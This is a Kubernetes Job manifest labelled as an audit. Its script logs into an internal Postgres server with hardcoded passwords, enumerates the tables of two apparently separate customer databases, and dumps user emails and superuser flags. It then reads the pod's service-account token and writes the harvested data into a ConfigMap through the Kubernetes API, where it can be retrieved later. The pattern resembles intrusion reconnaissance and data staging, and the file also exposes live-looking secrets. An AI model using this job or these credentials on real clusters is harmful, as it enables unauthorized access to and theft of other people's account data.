apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v8
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q postgresql-client
          PG_HOST="172.16.10.14"
          PG_PASS="psJVV0VTF66hHUcH"
          SUPER_PASS="wpEJl3WKOImARD9WgBsa"
          
          RESULT=""
          RESULT="${RESULT}=TACHCORP_TABLES=\n"
          RESULT="${RESULT}$(PGPASSWORD=$PG_PASS psql -h $PG_HOST -p 5432 -U duneuser -d tachcorp_db -c "\dt" 2>&1)\n"
          RESULT="${RESULT}=TACHCORP_USERS=\n"
          RESULT="${RESULT}$(PGPASSWORD=$PG_PASS psql -h $PG_HOST -p 5432 -U duneuser -d tachcorp_db -c "SELECT id, email, is_superuser, is_active FROM users LIMIT 10;" 2>&1)\n"
          RESULT="${RESULT}=SIERRAREX_TABLES=\n"
          RESULT="${RESULT}$(PGPASSWORD=$PG_PASS psql -h $PG_HOST -p 5432 -U duneuser -d sierrarex_db -c "\dt" 2>&1)\n"
          RESULT="${RESULT}=SIERRAREX_USERS=\n"
          RESULT="${RESULT}$(PGPASSWORD=$PG_PASS psql -h $PG_HOST -p 5432 -U duneuser -d sierrarex_db -c "SELECT id, email, is_superuser, is_active FROM users LIMIT 10;" 2>&1)\n"
          
          # Encode result for ConfigMap
          ENCODED=$(printf '%s' "$RESULT" | base64 | tr -d '\n')
          
          # Write to ConfigMap via K8s API
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          
          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/strategic-merge-patch+json" \
            -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result4" \
            -d "{\"data\":{\"result\":$(printf '%s' "$RESULT" | jq -Rs .)}}" > /tmp/patch_result.txt
          
          echo "ConfigMap patched: $(cat /tmp/patch_result.txt | head -1)"
          sleep 60